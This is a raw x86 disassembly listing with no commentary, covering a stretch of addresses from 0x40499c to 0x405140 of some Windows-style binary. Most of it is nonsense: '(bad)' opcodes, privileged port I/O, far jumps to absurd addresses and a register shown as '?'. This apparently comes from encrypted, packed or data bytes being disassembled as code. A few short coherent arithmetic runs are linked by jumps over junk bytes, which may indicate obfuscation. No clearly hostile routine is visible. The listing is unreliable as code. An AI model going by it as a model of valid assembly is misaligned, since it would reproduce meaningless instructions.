  40499c:	sbb    esp,DWORD PTR [edx+0x1258743e]
  4049a2:	out    dx,eax
  4049a3:	xor    eax,0x313927e2
  4049a8:	add    al,0xc7
  4049aa:	push   ss
  4049ab:	into   
  4049ac:	ins    DWORD PTR es:[edi],dx
  4049ad:	nop
  4049ae:	push   0x3ffa2ed6
  4049b3:	test   BYTE PTR [ebx-0x8db7003],al
  4049b9:	je     0x40499c
  4049bb:	sub    edx,DWORD PTR [ebx]
  4049bd:	sub    DWORD PTR [ebp+0x3d03373],ebp
  4049c3:	push   ebp
  4049c4:	in     al,dx
  4049c5:	jmp    0x404b6f
  4049ca:	test   BYTE PTR [ebp-0x13],cl
  4049cd:	xor    edi,ebp
  4049cf:	push   ebx
  4049d0:	mov    esp,0xd1280b5d
  4049d5:	xor    DWORD PTR [ecx-0x54],ebx
  4049d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4049d9:	jne    0x40496c
  4049db:	sub    al,0x7e
  4049dd:	jle    0x40496a
  4049df:	jg     0x404a5f
  4049e1:	jle    0x404a3b
  4049e3:	scas   al,BYTE PTR es:[edi]
  4049e4:	in     eax,0x6b
  4049e6:	adc    eax,esi
  4049e8:	test   BYTE PTR [edx-0xfd434a0],bh
  4049ee:	das    
  4049ef:	ins    DWORD PTR es:[edi],dx
  4049f0:	adc    DWORD PTR [eax+0x20e8ba8d],0xb22af978
  4049fa:	mov    ds:0xc24e5dd9,al
  4049ff:	xchg   ecx,eax
  404a00:	cdq    
  404a01:	(bad)  
  404a02:	xchg   BYTE PTR [ebp+ebx*4+0x62],bl
  404a06:	sbb    DWORD PTR [ebp+ebx*8+0x6d983d8d],ebx
  404a0d:	es sub dh,bl
  404a10:	leave  
  404a11:	rcr    DWORD PTR [edx+0x2b],cl
  404a14:	outs   dx,BYTE PTR ds:[esi]
  404a15:	pop    edi
  404a16:	sbb    BYTE PTR [ebp+0xe],bl
  404a19:	inc    esp
  404a1a:	sub    eax,0xfcf219ef
  404a1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404a20:	jb     0x404a83
  404a22:	into   
  404a23:	pushf  
  404a24:	out    0x4a,al
  404a26:	js     0x4049fb
  404a28:	fcom   QWORD PTR [esi+0x1f]
  404a2b:	in     eax,dx
  404a2c:	pop    esi
  404a2d:	cdq    
  404a2e:	aam    0x54
  404a30:	add    ebx,ebx
  404a32:	ss aam 0x15
  404a35:	mov    ah,0x2d
  404a37:	inc    eax
  404a38:	addr16 icebp 
  404a3a:	out    0xde,eax
  404a3c:	dec    ebx
  404a3d:	fidiv  WORD PTR [ebx+0x25605eb0]
  404a43:	stc    
  404a44:	outs   dx,BYTE PTR ds:[esi]
  404a45:	lods   eax,DWORD PTR es:[esi]
  404a47:	jae    0x4049cf
  404a49:	mov    ch,0x1
  404a4b:	xor    BYTE PTR [eax+0x1c],cl
  404a4e:	sub    al,dh
  404a50:	xchg   edi,eax
  404a51:	pusha  
  404a52:	mov    esi,?
  404a54:	inc    eax
  404a55:	add    eax,0xa5ace54
  404a5a:	aad    0xdd
  404a5c:	std    
  404a5d:	stos   DWORD PTR es:[edi],eax
  404a5e:	nop
  404a5f:	xlat   BYTE PTR ds:[ebx]
  404a60:	sbb    al,0xe8
  404a62:	(bad)  
  404a64:	mov    ah,0xa1
  404a66:	call   0xdab314c5
  404a6b:	out    0x2,eax
  404a6d:	data16 ins BYTE PTR es:[edi],dx
  404a6f:	mov    eax,0x403fb363
  404a74:	(bad)  
  404a75:	in     eax,dx
  404a76:	daa    
  404a77:	call   0x5786b22b
  404a7c:	or     al,0x33
  404a7e:	xchg   edi,eax
  404a7f:	mov    cl,cl
  404a81:	arpl   ax,bx
  404a83:	call   FWORD PTR [edx+0x4b]
  404a86:	pop    ebp
  404a87:	sbb    DWORD PTR [ebp+0x2cd4e5f1],esp
  404a8d:	rol    BYTE PTR [esi],0xdc
  404a90:	idiv   DWORD PTR [eax]
  404a92:	pop    esp
  404a93:	sbb    al,0x63
  404a95:	out    0x7b,al
  404a97:	into   
  404a98:	inc    edi
  404a99:	push   es
  404a9a:	pop    es
  404a9b:	push   esi
  404a9c:	sub    BYTE PTR [ecx-0x5d],0xaa
  404aa0:	dec    edi
  404aa1:	jmp    0x18b2:0x4eb89681
  404aa8:	sub    al,0xcd
  404aaa:	push   es
  404aab:	dec    esp
  404aac:	pxor   mm0,QWORD PTR [edi]
  404aaf:	aas    
  404ab0:	mov    gs,WORD PTR [ebp+0xf3a9417]
  404ab6:	or     al,0xf6
  404ab8:	pop    esi
  404ab9:	push   edx
  404aba:	shl    BYTE PTR es:[edi-0x6e6d7cb8],cl
  404ac1:	shl    BYTE PTR ds:0x904d935c,cl
  404ac7:	fst    QWORD PTR [ecx]
  404ac9:	mov    ch,0x16
  404acb:	leave  
  404acc:	mov    bl,0x12
  404ace:	in     al,dx
  404acf:	fwait
  404ad0:	xor    eax,0xab4143eb
  404ad5:	lods   al,BYTE PTR ds:[esi]
  404ad6:	or     eax,0xcac5eb63
  404adb:	cli    
  404adc:	hlt    
  404add:	xchg   edx,eax
  404ade:	xchg   ebx,eax
  404adf:	or     eax,0x1d3f5826
  404ae4:	cwde   
  404ae5:	outs   dx,BYTE PTR ds:[esi]
  404ae6:	adc    esp,edx
  404ae8:	hlt    
  404ae9:	sub    dh,BYTE PTR [ebp-0x2b]
  404aec:	inc    esp
  404aed:	or     al,0xc9
  404aef:	cmp    al,BYTE PTR [eax]
  404af1:	icebp  
  404af2:	pop    esi
  404af3:	test   BYTE PTR [ebx+0x67],al
  404af6:	call   0x95e8cb75
  404afb:	shl    edi,0xe0
  404afe:	push   0x33436134
  404b03:	scas   al,BYTE PTR es:[edi]
  404b04:	pop    ecx
  404b05:	pop    ebp
  404b06:	sub    bh,dh
  404b08:	jnp    0x404a9b
  404b0a:	fucom  st(1)
  404b0c:	fnstsw WORD PTR [esi-0x6e8969ee]
  404b12:	stos   DWORD PTR es:[edi],eax
  404b13:	aam    0x17
  404b15:	xor    edx,edi
  404b17:	mov    ch,0xba
  404b19:	sub    eax,0xf291f218
  404b1e:	dec    esi
  404b1f:	sbb    ebp,0x79
  404b22:	popf   
  404b23:	xor    BYTE PTR [edi+ebp*2-0x77],0x17
  404b28:	and    BYTE PTR [ebp+0x6c476201],al
  404b2e:	mov    dl,0xf7
  404b30:	pop    ss
  404b31:	jle    0x404b77
  404b33:	repz call 0x2753ea30
  404b39:	mov    dh,0xad
  404b3b:	jecxz  0x404b86
  404b3d:	imul   ebp,DWORD PTR [eax+0x16],0x6cea092d
  404b44:	pop    edi
  404b45:	add    esp,edx
  404b47:	stc    
  404b48:	lea    edi,[ecx+0x33403202]
  404b4e:	loope  0x404b82
  404b50:	push   ebp
  404b51:	mov    esp,0x20a9d8d7
  404b56:	jbe    0x404b25
  404b58:	imul   esp,DWORD PTR [ebx],0xfffffffc
  404b5b:	stos   BYTE PTR es:[edi],al
  404b5c:	fidiv  WORD PTR [edx+0x42]
  404b5f:	je     0x404bc1
  404b61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b62:	ror    BYTE PTR [ecx+0x35],1
  404b65:	pop    ecx
  404b66:	mov    eax,ds:0x3940e027
  404b6b:	and    al,0x68
  404b6d:	xchg   edi,eax
  404b6e:	(bad)  [ebx-0x6b751b83]
  404b74:	cmp    bl,BYTE PTR [ebp-0x77ffcd8e]
  404b7a:	push   ebp
  404b7b:	or     ecx,DWORD PTR [edx+0x7d8b0f55]
  404b81:	hlt    
  404b82:	xor    edi,eax
  404b84:	add    edi,DWORD PTR [ebp-0x14]
  404b87:	jmp    0x404d31
  404b8c:	in     al,dx
  404b8d:	push   esi
  404b8e:	adc    dh,BYTE PTR [eax+0x6a6c4c94]
  404b94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b95:	(bad)  
  404b96:	aas    
  404b97:	push   eax
  404b98:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b99:	loop   0x404b45
  404b9b:	popf   
  404b9c:	cs cs jle 0x404c1e
  404ba0:	mov    edi,DWORD PTR [edi+0x7e]
  404ba3:	jle    0x404b35
  404ba5:	out    dx,al
  404ba6:	jp     0x404c14
  404ba8:	or     al,BYTE PTR [eax-0x29]
  404bab:	jl     0x404b9a
  404bad:	mov    edx,0x987ba03e
  404bb2:	lods   eax,DWORD PTR ds:[esi]
  404bb3:	cs pop ebx
  404bb5:	aad    0x73
  404bb7:	loopne 0x404c13
  404bb9:	into   
  404bba:	(bad)  
  404bbc:	jns    0x404b4f
  404bbe:	call   0xef5b:0xd71c6d77
  404bc5:	pop    ecx
  404bc6:	dec    ebp
  404bc7:	dec    ebx
  404bc8:	aad    0xa9
  404bca:	aam    0x7f
  404bcc:	adc    DWORD PTR ds:0xc7d9491c,esi
  404bd2:	or     ebx,DWORD PTR [ecx]
  404bd4:	mov    cs,WORD PTR [eax-0x66]
  404bd7:	out    dx,al
  404bd8:	sub    eax,0xce71c5cc
  404bdd:	or     cl,BYTE PTR [ebx+0x2e9e6b2f]
  404be3:	xchg   edx,eax
  404be4:	cmp    al,0x79
  404be6:	call   0xd8cdbfa1
  404beb:	movzx  esp,WORD PTR [ebx]
  404bee:	jmp    0x404bb4
  404bf0:	(bad)  
  404bf2:	inc    esi
  404bf3:	jmp    0x5351:0x44b6b6fb
  404bfa:	mov    al,0x42
  404bfc:	or     al,cl
  404bfe:	test   DWORD PTR [esi],esi
  404c00:	xchg   edx,eax
  404c01:	and    ebx,esi
  404c03:	pop    esi
  404c04:	scas   al,BYTE PTR es:[edi]
  404c05:	jle    0x404c39
  404c07:	fdiv   DWORD PTR [edi+0x76c30e81]
  404c0d:	out    0xbe,eax
  404c0f:	push   eax
  404c10:	ret    
  404c11:	add    dh,al
  404c13:	adc    DWORD PTR [ebp-0x53],ecx
  404c16:	sbb    BYTE PTR [edi+edx*2-0x51],bh
  404c1a:	repnz and DWORD PTR [esi+eiz*4],esi
  404c1e:	leave  
  404c1f:	adc    al,BYTE PTR [edx+0xb]
  404c22:	mov    DWORD PTR [ebp-0x562fc01],ebx
  404c28:	out    0x5f,eax
  404c2a:	fst    st(1)
  404c2c:	stos   BYTE PTR es:[edi],al
  404c2d:	jge    0x404c74
  404c2f:	sub    edi,ebx
  404c31:	aad    0x78
  404c33:	stos   BYTE PTR es:[edi],al
  404c34:	in     al,0xf8
  404c36:	je     0x404bd2
  404c38:	pop    ss
  404c39:	stos   DWORD PTR es:[edi],eax
  404c3a:	inc    eax
  404c3b:	stos   BYTE PTR es:[edi],al
  404c3c:	or     eax,0x45487bcf
  404c41:	cmp    BYTE PTR [eax],ch
  404c43:	xchg   esp,eax
  404c44:	addr16 pop ebp
  404c46:	fcom   DWORD PTR [ecx]
  404c48:	test   DWORD PTR [ebx+0x69eac0e1],0xb4ceacf
  404c52:	ss rol cl,1
  404c55:	push   ebp
  404c56:	add    dl,BYTE PTR [eax+0x1e]
  404c59:	jbe    0x404c10
  404c5b:	inc    ecx
  404c5c:	inc    ebp
  404c5d:	dec    ecx
  404c5e:	or     ah,BYTE PTR [eax+0x19]
  404c61:	(bad)  
  404c62:	xacquire xchg DWORD PTR [ecx],ebp
  404c65:	fisubr DWORD PTR [eax+ebx*1]
  404c68:	or     ah,BYTE PTR [eax+0x75]
  404c6b:	xchg   edx,eax
  404c6c:	les    ecx,FWORD PTR [ebx+0x440817f7]
  404c72:	xchg   esi,eax
  404c73:	mov    eax,ds:0x29a16532
  404c78:	pop    es
  404c79:	(bad)  
  404c7a:	data16 jo 0x404c2f
  404c7d:	pop    edx
  404c7e:	push   ecx
  404c7f:	sbb    al,0x91
  404c81:	pop    edi
  404c82:	cmc    
  404c83:	xor    DWORD PTR [eax],ecx
  404c85:	push   ebx
  404c86:	push   edx
  404c87:	std    
  404c88:	lods   al,BYTE PTR ds:[esi]
  404c89:	add    al,BYTE PTR [edx+eax*1+0x57f09e87]
  404c90:	in     eax,dx
  404c91:	sbb    BYTE PTR [edx+0x27eb8e9f],al
  404c97:	test   ch,al
  404c99:	jne    0x404c80
  404c9b:	dec    DWORD PTR ds:0x53f7641d
  404ca1:	repnz and eax,ebx
  404ca4:	dec    edx
  404ca5:	xchg   DWORD PTR [eax-0x75],edx
  404ca8:	adc    eax,0x877d03af
  404cad:	sub    BYTE PTR [ebx+0x296d86b3],dl
  404cb3:	mov    WORD PTR [ebp+0xa],fs
  404cb6:	fstp   QWORD PTR [esi+0x448f590d]
  404cbc:	jnp    0x404cc8
  404cbe:	test   bl,ch
  404cc0:	loope  0x404d03
  404cc2:	enter  0xf61c,0x32
  404cc6:	mov    ah,0xd1
  404cc8:	inc    esp
  404cc9:	xor    BYTE PTR [ebx-0x4e],0x6a
  404ccd:	jmp    0x404d0e
  404ccf:	xor    ch,BYTE PTR [eax+0x16]
  404cd2:	daa    
  404cd3:	pushf  
  404cd4:	test   al,0xc7
  404cd6:	xor    al,0xa9
  404cd8:	sub    cl,dl
  404cda:	jne    0x404cdb
  404cdc:	mov    ds:0x3d2102cb,eax
  404ce1:	mov    dh,0x39
  404ce3:	mov    cl,0xc8
  404ce5:	pop    esp
  404ce6:	clc    
  404ce7:	and    cl,dh
  404ce9:	add    al,0x6d
  404ceb:	daa    
  404cec:	(bad)  
  404cee:	mov    ah,0xb
  404cf0:	in     al,dx
  404cf1:	adc    cl,al
  404cf3:	xor    DWORD PTR [edi],ebp
  404cf5:	sbb    ch,BYTE PTR ds:0xce1d90a5
  404cfb:	lods   eax,DWORD PTR ds:[esi]
  404cfc:	rcl    BYTE PTR [esi-0x66],1
  404cff:	inc    ebx
  404d00:	loop   0x404ce3
  404d02:	push   eax
  404d03:	imul   ebx,DWORD PTR [esi+0x607335d4],0xfffffff0
  404d0a:	gs in  al,dx
  404d0c:	jns    0x404d7f
  404d0e:	adc    al,0x66
  404d10:	pop    ebx
  404d11:	das    
  404d12:	xchg   edi,eax
  404d13:	xchg   DWORD PTR [ecx],edx
  404d15:	std    
  404d16:	lods   al,BYTE PTR ds:[esi]
  404d17:	push   cs
  404d18:	pop    ecx
  404d19:	div    DWORD PTR [eax-0x33878b22]
  404d1f:	lds    ebp,FWORD PTR [ebp+edi*8-0x5da75cac]
  404d26:	cmc    
  404d27:	lea    ebx,[ebp+0x10]
  404d2a:	jnp    0x404d35
  404d2c:	sub    edx,DWORD PTR [eax+0x58]
  404d2f:	pop    ecx
  404d30:	mov    ecx,0x88e45d8b
  404d35:	xchg   esp,eax
  404d36:	pop    ds
  404d37:	popf   
  404d38:	jb     0x404d6c
  404d3a:	add    BYTE PTR [edx+0x7d8b0b55],cl
  404d40:	call   0x7d444578
  404d45:	in     al,dx
  404d46:	mov    ebx,DWORD PTR [ebp-0x1c]
  404d49:	mov    BYTE PTR [edi+ebx*1+0x32729d],dl
  404d50:	mov    edx,DWORD PTR [ebp-0x44]
  404d53:	mov    edi,DWORD PTR [ebp-0xc]
  404d56:	xor    edx,eax
  404d58:	xor    edi,eax
  404d5a:	add    edx,ecx
  404d5c:	add    edi,ecx
  404d5e:	imul   edx,edi
  404d61:	add    edx,DWORD PTR [ebp-0x14]
  404d64:	mov    DWORD PTR [ebp-0x14],edx
  404d67:	mov    edx,DWORD PTR [ebp-0xc]
  404d6a:	mov    edi,DWORD PTR [ebp-0x24]
  404d6d:	xor    edx,eax
  404d6f:	add    edx,ecx
  404d71:	imul   edx,edi
  404d74:	mov    edi,DWORD PTR [ebp-0xc]
  404d77:	xor    edi,eax
  404d79:	sub    edx,edi
  404d7b:	mov    edi,DWORD PTR [ebp-0xc]
  404d7e:	mov    ebx,DWORD PTR [ebp-0x14]
  404d81:	jmp    0x404f2b
  404d86:	test   DWORD PTR [ebp+0x21bc10ba],0xf561ad9d
  404d90:	xchg   ebp,eax
  404d91:	and    BYTE PTR [eax-0x445daf0a],ch
  404d97:	das    
  404d98:	jle    0x404e18
  404d9a:	mov    edi,DWORD PTR [edi+0x7e]
  404d9d:	jle    0x404dc3
  404d9f:	xor    BYTE PTR [ecx+ebx*8-0x3811dda1],cl
  404da6:	in     al,dx
  404da7:	fldcw  WORD PTR [ebx-0x6c]
  404daa:	scas   al,BYTE PTR es:[edi]
  404dab:	es pop es
  404dad:	js     0x404d41
  404daf:	mov    dh,0x6b
  404db1:	movups xmm5,xmm4
  404db4:	and    DWORD PTR [ebp-0xe],0xffffff81
  404db8:	fnstsw WORD PTR [esi-0x36]
  404dbb:	idiv   DWORD PTR [ecx+0x4d]
  404dbe:	iret   
  404dbf:	cwde   
  404dc0:	jg     0x404d91
  404dc2:	dec    ebp
  404dc3:	xor    eax,0x171a9a7e
  404dc8:	lea    ebx,ds:0xf07777f7
  404dce:	ja     0x404e21
  404dd0:	pop    ebp
  404dd1:	outs   dx,BYTE PTR ds:[esi]
  404dd2:	push   ds
  404dd3:	(bad)  
  404dd4:	popa   
  404dd5:	jg     0x404d90
  404dd7:	xchg   edx,eax
  404dd8:	xor    ecx,DWORD PTR [eax-0x42c94f48]
  404dde:	mov    edx,0xd622a010
  404de3:	out    0x84,al
  404de5:	imul   eax,DWORD PTR [edi+ebx*1-0x11],0xffffffd4
  404dea:	and    edx,DWORD PTR [edi]
  404dec:	(bad)  [ecx-0x7258873c]
  404df2:	lods   eax,DWORD PTR ds:[esi]
  404df3:	lock js 0x404e01
  404df6:	repz enter 0xd31d,0xfa
  404dfb:	fild   WORD PTR [edx-0x1]
  404dfe:	(bad)  
  404dff:	push   ebx
  404e00:	dec    edi
  404e01:	adc    al,0x9f
  404e03:	test   DWORD PTR [ecx-0x5f58d260],eax
  404e09:	ja     0x404e4a
  404e0b:	inc    edx
  404e0c:	stos   BYTE PTR es:[edi],al
  404e0d:	(bad)  
  404e0e:	pushf  
  404e0f:	or     edi,ebx
  404e11:	sub    ecx,ebp
  404e13:	arpl   WORD PTR [edx+edi*1],bp
  404e16:	mov    edi,0x74447f90
  404e1b:	push   ss
  404e1c:	aaa    
  404e1d:	outs   dx,DWORD PTR ds:[esi]
  404e1e:	and    eax,0xa76917b7
  404e23:	ret    0x9f55
  404e26:	outs   dx,DWORD PTR ds:[esi]
  404e27:	mov    esi,0x7cb0082d
  404e2c:	xchg   edi,eax
  404e2d:	aad    0x0
  404e2f:	xor    al,0xfa
  404e31:	push   esi
  404e32:	ret    
  404e33:	mov    ch,0x3
  404e35:	push   edx
  404e36:	sub    ah,BYTE PTR [edi]
  404e38:	jb     0x404e94
  404e3a:	inc    ebp
  404e3b:	inc    edx
  404e3c:	xchg   esi,eax
  404e3d:	and    edi,ecx
  404e3f:	pop    ebx
  404e40:	and    edx,DWORD PTR [esi-0xd6dee79]
  404e46:	out    dx,eax
  404e47:	cli    
  404e48:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e49:	fwait
  404e4a:	mov    WORD PTR [ecx+0x28],cs
  404e4d:	xchg   BYTE PTR [ecx+0x18d74b3f],cl
  404e53:	cmp    DWORD PTR [edx+0x49],esp
  404e56:	pusha  
  404e57:	ins    BYTE PTR es:[edi],dx
  404e58:	es icebp 
  404e5a:	js     0x404eab
  404e5c:	sub    eax,0xc21d468b
  404e61:	pop    eax
  404e62:	lahf   
  404e63:	push   0x17cc17a0
  404e68:	xchg   ebp,eax
  404e69:	and    ebp,DWORD PTR [ebp+0x7b]
  404e6c:	mov    ebp,0xdb8dccc8
  404e71:	jmp    0x30dc:0x8704203b
  404e78:	or     cl,BYTE PTR [esi]
  404e7a:	xor    BYTE PTR [edi-0x6e2d6fa],dl
  404e80:	push   ebx
  404e81:	sub    dh,ch
  404e83:	js     0x404e4d
  404e85:	or     al,0x3c
  404e87:	mov    bh,0xc0
  404e89:	xchg   BYTE PTR ds:0xb857f23a,ah
  404e8f:	out    0xcf,eax
  404e91:	sub    eax,0xdc131bde
  404e96:	xor    bl,bl
  404e98:	sub    eax,0x602ca359
  404e9d:	cmp    bh,cl
  404e9f:	(bad)  
  404ea0:	xor    BYTE PTR [ecx+0x491ce1a2],cl
  404ea6:	test   al,0x38
  404ea8:	pop    eax
  404ea9:	retf   0x738c
  404eac:	int    0xb5
  404eae:	mov    DWORD PTR [esi-0x7c7d7b7f],esp
  404eb4:	xor    edi,DWORD PTR [esi-0x318fcafc]
  404eba:	mov    ds:0x41f5c558,al
  404ebf:	pop    edx
  404ec0:	inc    esp
  404ec1:	cli    
  404ec2:	sbb    edi,DWORD PTR [ebp+0x56c1d8f4]
  404ec8:	retf   
  404ec9:	push   ecx
  404eca:	mov    ds:0x3ddc0338,al
  404ecf:	dec    eax
  404ed0:	jno    0x404f4f
  404ed2:	shr    esp,1
  404ed4:	push   ds
  404ed5:	aad    0x43
  404ed7:	sbb    eax,0xc1ca01c8
  404edc:	cmp    BYTE PTR [ebx+0x5f],al
  404edf:	mov    bl,BYTE PTR [edx+0x5]
  404ee2:	dec    esi
  404ee3:	fucomip st,st(5)
  404ee5:	pop    eax
  404ee6:	cmp    eax,0xe4084555
  404eeb:	add    BYTE PTR [eax-0x39a46326],bl
  404ef1:	add    BYTE PTR [edi],al
  404ef3:	push   edx
  404ef4:	mov    dh,0x93
  404ef6:	cld    
  404ef7:	or     DWORD PTR [ebx+0x26925d13],0xf045b9b8
  404f01:	and    eax,0x3e1d06d8
  404f06:	ss fxtract 
  404f09:	jmp    DWORD PTR [edx]
  404f0b:	sub    al,0xaf
  404f0d:	ja     0x404e97
  404f0f:	inc    ecx
  404f10:	outs   dx,DWORD PTR ds:[esi]
  404f11:	cmp    cl,BYTE PTR [ebx+0x72]
  404f14:	and    eax,0xc97ef5c0
  404f19:	mov    ebp,0xed2a05c4
  404f1e:	(bad)  
  404f1f:	mov    esp,0xfe653c67
  404f24:	jecxz  0x404f39
  404f26:	mov    ebp,DWORD PTR [edx+edi*4]
  404f29:	push   0x3f833bb
  404f2e:	stc    
  404f2f:	imul   edi,ebx
  404f32:	jmp    0x4050dc
  404f37:	mov    esp,0xfaa10ab4
  404f3c:	jns    0x404efb
  404f3e:	dec    ebp
  404f3f:	mov    edx,0x81d15a29
  404f44:	sbb    DWORD PTR [eax+0x7e21c854],ebx
  404f4a:	jle    0x404ed7
  404f4c:	jg     0x404fcc
  404f4e:	jle    0x404fc7
  404f50:	pop    ebp
  404f51:	jl     0x404fb0
  404f53:	pop    edx
  404f54:	push   esi
  404f55:	xchg   ecx,eax
  404f56:	xor    cl,BYTE PTR [eax-0x6c]
  404f59:	mov    fs,WORD PTR [edi-0x5a]
  404f5c:	loopne 0x404f57
  404f5e:	in     al,dx
  404f5f:	pop    esp
  404f60:	int3   
  404f61:	mov    bl,0xa2
  404f63:	mov    dh,0xd5
  404f65:	les    edx,FWORD PTR [eax+0x2311da07]
  404f6b:	cli    
  404f6c:	cmp    DWORD PTR [eax-0x19],edi
  404f6f:	daa    
  404f70:	outs   dx,DWORD PTR ds:[esi]
  404f71:	sbb    al,0x27
  404f73:	in     al,0x78
  404f75:	mov    WORD PTR [ecx-0x3b],ds
  404f78:	(bad)  
  404f79:	ins    BYTE PTR es:[edi],dx
  404f7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f7b:	pusha  
  404f7c:	(bad)  
  404f7d:	inc    ebx
  404f7e:	retf   0xb356
  404f81:	mov    BYTE PTR [ebx],ch
  404f83:	mov    eax,ds:0x7e866db
  404f88:	pushf  
  404f89:	add    al,0x75
  404f8b:	dec    ebp
  404f8c:	out    dx,eax
  404f8d:	mov    edx,0xb73c937c
  404f92:	sbb    BYTE PTR [esi+0x1a],0x17
  404f96:	push   0x21
  404f98:	mov    al,0x56
  404f9a:	mov    edi,0x7ac25e24
  404f9f:	xor    ah,BYTE PTR [edi+0x77bccee6]
  404fa5:	jmp    0x505658f6
  404faa:	mov    ecx,0xfc353120
  404faf:	dec    esp
  404fb0:	jo     0x404f8e
  404fb2:	(bad)  
  404fb3:	data16 mov WORD PTR [edx-0x28],ds
  404fb7:	mov    al,ds:0x5ff95603
  404fbc:	xor    ebp,DWORD PTR [esi+0x63]
  404fbf:	in     eax,0x3e
  404fc1:	hlt    
  404fc2:	push   0xfc3d62ed
  404fc7:	xor    eax,0xb6326883
  404fcc:	dec    ebp
  404fcd:	loopne 0x405004
  404fcf:	inc    eax
  404fd0:	int3   
  404fd1:	nop
  404fd2:	push   ss
  404fd3:	cs mov ch,0x55
  404fd6:	xchg   ebp,eax
  404fd7:	dec    edi
  404fd8:	or     eax,0xcc5a0803
  404fdd:	arpl   WORD PTR [ebx+0x63],sp
  404fe0:	pusha  
  404fe1:	adc    ebp,DWORD PTR [edi-0x48]
  404fe4:	pop    gs
  404fe6:	ins    DWORD PTR es:[edi],dx
  404fe7:	push   ebp
  404fe8:	leave  
  404fe9:	or     BYTE PTR [ebx+0x2e9597da],0xc9
  404ff0:	mov    ebx,0x89c8d51e
  404ff5:	(bad)  
  404ff6:	adc    ebp,DWORD PTR [esi+0x62]
  404ff9:	jle    0x405006
  404ffb:	pop    eax
  404ffc:	data16 in al,dx
  404ffe:	push   ss
  404fff:	out    dx,al
  405000:	lahf   
  405001:	dec    ecx
  405002:	mov    esp,eax
  405004:	in     eax,0xcb
  405006:	stc    
  405007:	dec    ebx
  405008:	aad    0xeb
  40500a:	idiv   DWORD PTR [eax+0x67d89d55]
  405010:	add    eax,0x6056803d
  405015:	inc    ebp
  405016:	inc    ebp
  405017:	adc    esp,0xc2346d7f
  40501d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40501e:	and    al,0x52
  405020:	mov    esi,0xded88304
  405025:	sbb    al,0x4c
  405027:	mov    DWORD PTR [ecx-0x3df5e53],esi
  40502d:	(bad)  
  40502e:	loop   0x404fdc
  405030:	pop    esp
  405031:	cld    
  405032:	rol    BYTE PTR [ebp+0x4a],1
  405035:	pop    ebx
  405036:	das    
  405037:	je     0x405032
  405039:	int3   
  40503a:	or     bl,dh
  40503c:	out    0xfa,al
  40503e:	xchg   ecx,eax
  40503f:	inc    ebp
  405040:	sar    BYTE PTR [edi-0x6b],1
  405043:	xor    bh,ah
  405045:	push   eax
  405046:	xor    cl,BYTE PTR ds:0x81a3d139
  40504c:	(bad)  
  40504d:	jp     0x4050c7
  40504f:	leave  
  405050:	pop    esp
  405051:	push   eax
  405052:	xor    DWORD PTR [ecx+0xd6a98c7],0xffffffb8
  405059:	aas    
  40505a:	out    0xba,al
  40505c:	sbb    eax,0x9a0e50b
  405061:	lea    eax,[esi+0x67]
  405064:	es jecxz 0x404fe8
  405067:	or     dl,BYTE PTR [ebx+edx*8]
  40506a:	inc    ebp
  40506b:	add    DWORD PTR [edi-0x6bdbc887],0xffffffff
  405072:	pop    ebp
  405073:	addr16 inc esi
  405075:	call   0xc881df31
  40507a:	lea    edi,[ecx-0x69]
  40507d:	fadd   QWORD PTR [ebp-0x1cdcdd9d]
  405083:	outs   dx,BYTE PTR ds:[esi]
  405084:	lods   eax,DWORD PTR ds:[esi]
  405085:	sub    BYTE PTR [esi+0x61af06d3],dl
  40508b:	jo     0x4050d1
  40508d:	cmp    BYTE PTR [ebp-0x74],ch
  405090:	cmc    
  405091:	lock push ebp
  405093:	ror    eax,1
  405095:	push   esi
  405096:	sbb    al,0xee
  405098:	push   esp
  405099:	jp     0x4050ac
  40509b:	(bad)  
  40509c:	fisub  DWORD PTR [esi-0x7b]
  40509f:	popa   
  4050a0:	neg    ecx
  4050a2:	jmp    0xede:0xcaad9c5d
  4050a9:	add    BYTE PTR [edx+ecx*4+0x2e],dh
  4050ad:	mul    DWORD PTR [edx]
  4050af:	push   0xea7f318d
  4050b4:	test   esp,ebp
  4050b6:	jp     0x4050e9
  4050b8:	add    DWORD PTR [esi],edi
  4050ba:	in     eax,dx
  4050bb:	outs   dx,DWORD PTR ds:[esi]
  4050bc:	mov    DWORD PTR [esi],ebp
  4050be:	std    
  4050bf:	jb     0x405063
  4050c1:	and    al,0xf4
  4050c3:	and    eax,0x9e631f8b
  4050c8:	cmp    al,0x37
  4050ca:	sub    eax,0xc67b7ef3
  4050cf:	push   edx
  4050d0:	ja     0x4050eb
  4050d2:	and    eax,0x2ae3001f
  4050d7:	scas   eax,DWORD PTR es:[edi]
  4050d8:	cmp    dl,BYTE PTR [eax]
  4050da:	nop
  4050db:	jle    0x405068
  4050dd:	pop    ebp
  4050de:	call   0xd16c2916
  4050e3:	lea    edi,[edi+ebx*1+0x32729d]
  4050ea:	cmp    edi,edx
  4050ec:	jbe    0x404654
  4050f2:	mov    edx,DWORD PTR [ebp-0xc]
  4050f5:	mov    edi,DWORD PTR [ebp-0x24]
  4050f8:	xor    edx,eax
  4050fa:	add    edx,ecx
  4050fc:	jmp    0x4052a6
  405101:	pop    edi
  405102:	mov    DWORD PTR [ebp+ebx*8-0x42980294],edx
  405109:	sbb    al,0x25
  40510b:	or     ebx,ecx
  40510d:	push   edi
  40510e:	inc    esi
  40510f:	out    0x66,eax
  405111:	inc    ebp
  405112:	and    bh,BYTE PTR [esi+0x7e]
  405115:	mov    edi,DWORD PTR [edi+0x7e]
  405118:	jle    0x405159
  40511a:	pop    ecx
  40511b:	xor    DWORD PTR [ecx+edx*8],ebx
  40511e:	add    eax,0x497e39
  405123:	addr16 cmc 
  405125:	add    ebp,DWORD PTR es:[esi]
  405128:	sub    ebx,esp
  40512a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40512b:	mov    ?,esi
  40512d:	and    DWORD PTR [ebx-0x2b8d90d7],0xffffff9b
  405134:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405135:	dec    edx
  405136:	retf   
  405137:	push   edi
  405138:	bound  ebp,QWORD PTR [esi+esi*4]
  40513b:	dec    edi
  40513c:	js     0x4050e1
  40513e:	jne    0x4050e6
  405140:	sub    al,0x4a
